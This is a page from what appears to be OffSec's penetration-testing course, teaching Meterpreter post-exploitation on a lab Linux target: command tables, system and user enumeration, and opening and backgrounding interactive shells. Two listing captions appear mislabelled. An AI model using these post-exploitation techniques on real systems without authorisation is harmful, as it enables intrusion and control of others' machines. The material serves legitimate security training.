# # OffSec

Penetration Testing with Kali Linux

| | |
|---|---|
| localtime | Displays the target system local date and time
| pgrep | Filter processes by name
| pkill | Terminates processes by name
| ps | List running processes
| shell | Drop into a system command shell
| suspend | Suspends and resumes a list of processes
| sysinfo | Gets information about the remote system, as OS

> Listing 651 - Display compatible payloads of the exploit

A few moments after the exploit mode is launched, we'll get a Meterpreter command prompt as shown in figure. The commands of Meterpreter are divided into categories such as System Commands, Networking, and File Commands.

Let's get familiar with the Meterpreter commands. We'll start gathering information by entering `sysinfo` and `getuid`.

```
meterpreter > sysinfo
Computer : 172.29.0.2
OS : Ubuntu 20.04 (Linux 5.4.0-122-generic)
Architecture : x64
BuildTuple : x86_64-linux-musl
Meterpreter : x64/linux
```

```
meterpreter > getuid
Server username: daemon
```

> Listing 652 - Display compatible payloads of the exploit

The commands provide us with information about the target computer, operating system, and the current user.

As we've already learned, Metasploit uses sessions to manage access to different machines. When Metasploit interacts with a system within a session, it uses a concept named channels. Let's start an interactive shell by executing `shell`, execute a command in the context of a channel, and background the channel shell. To background a channel, we can use `Ctrl+Z`.

```
meterpreter > shell
Process 194 created.
Channel 1 created.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
z
Background channel 1? [y/N] y
```

> Listing 653 - Start a channel and background it

Next, we'll start a second interactive shell, execute a command, and also, background the channel.

```
meterpreter > shell
Process 196 created.
Channel 2 created.
whoami
daemon
^Z
Background channel 2? [y/N] y
```

PWK - © 2023 OffSec Services Limited. All rights reserved.

658